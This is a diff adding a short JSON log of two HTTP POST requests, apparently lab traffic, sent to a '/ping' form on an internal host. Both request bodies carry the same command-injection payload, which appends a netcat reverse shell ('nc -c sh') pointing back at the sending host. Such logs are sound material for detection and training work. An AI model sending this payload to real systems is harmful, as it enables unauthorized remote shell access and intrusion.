@@ -1,0 +1,50 @@
+{
+    "timestamp": "2025-05-31T10:00:53.735808",
+    "client_ip": "10.10.20.5",
+    "method": "POST",
+    "url": "https://10.10.30.5/ping",
+    "headers": {
+        "Host": "10.10.30.5",
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Accept-Encoding": "gzip, deflate, br, zstd",
+        "Referer": "https://10.10.30.5/ping",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Content-Length": "44",
+        "Origin": "https://10.10.30.5",
+        "Connection": "keep-alive",
+        "Upgrade-Insecure-Requests": "1",
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "same-origin",
+        "Sec-Fetch-User": "?1",
+        "Priority": "u=0, i"
+    },
+    "body": "website=8.8.8.8+%3B+nc+-c+sh+10.10.20.5+1234"
+}
+{
+    "timestamp": "2025-05-31T10:40:53.268909",
+    "client_ip": "10.10.20.5",
+    "method": "POST",
+    "url": "https://10.10.30.5/ping",
+    "headers": {
+        "Host": "10.10.30.5",
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Accept-Encoding": "gzip, deflate, br, zstd",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Content-Length": "44",
+        "Origin": "https://10.10.30.5",
+        "Connection": "keep-alive",
+        "Referer": "https://10.10.30.5/ping",
+        "Upgrade-Insecure-Requests": "1",
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "same-origin",
+        "Sec-Fetch-User": "?1",
+        "Priority": "u=0, i"
+    },
+    "body": "website=8.8.8.8+%3B+nc+-c+sh+10.10.20.5+1234"
+}
